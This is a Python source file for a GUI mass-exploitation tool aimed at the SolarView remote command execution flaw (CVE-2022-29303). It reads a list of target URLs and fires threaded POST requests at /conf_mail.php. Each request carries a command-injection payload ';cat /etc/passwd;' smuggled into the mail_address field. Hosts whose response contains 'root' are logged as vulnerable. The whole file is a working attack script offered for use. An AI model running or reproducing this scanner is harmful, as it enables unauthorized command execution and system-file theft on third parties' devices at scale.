import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def SolarView_rce_CVE_2022_29303_exp(url):
    poc = r"""/conf_mail.php"""
    url = url + poc
    data = "mail_address=%3Bcat%20/etc/passwd%3B&button=%83%81%81%5B%83%8B%91%97%90M"
    try:
        res = requests.post(url, data=data,verify=False,timeout=3)
        print(res.text)
        if "root" in res.text:
            SolarView_rce_CVE_2022_29303_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            SolarView_rce_CVE_2022_29303_text.see(END)
            with open ("存在SolarView远程命令执行漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            SolarView_rce_CVE_2022_29303_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            SolarView_rce_CVE_2022_29303_text.see(END)
    except Exception as err:
        SolarView_rce_CVE_2022_29303_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        SolarView_rce_CVE_2022_29303_text.see(END)
def get_yyu8_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def SolarView_rce_CVE_2022_29303_gui():
    SolarView_rce_CVE_2022_29303 = tk.Tk()
    SolarView_rce_CVE_2022_29303.geometry("910x450")
    SolarView_rce_CVE_2022_29303.title("SolarView远程命令执行漏洞漏洞(CVE-2022-29303)一把梭")
    SolarView_rce_CVE_2022_29303.resizable(0, 0)
    SolarView_rce_CVE_2022_29303.iconbitmap('logo.ico')
    global SolarView_rce_CVE_2022_29303_text
    SolarView_rce_CVE_2022_29303_text = scrolledtext.ScrolledText(SolarView_rce_CVE_2022_29303,width=123, height=25)
    SolarView_rce_CVE_2022_29303_text.grid(row=0, column=0, padx=10, pady=10)
    SolarView_rce_CVE_2022_29303_text.see(END)
    addrs = get_yyu8_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(SolarView_rce_CVE_2022_29303_exp, addr)
    SolarView_rce_CVE_2022_29303.mainloop()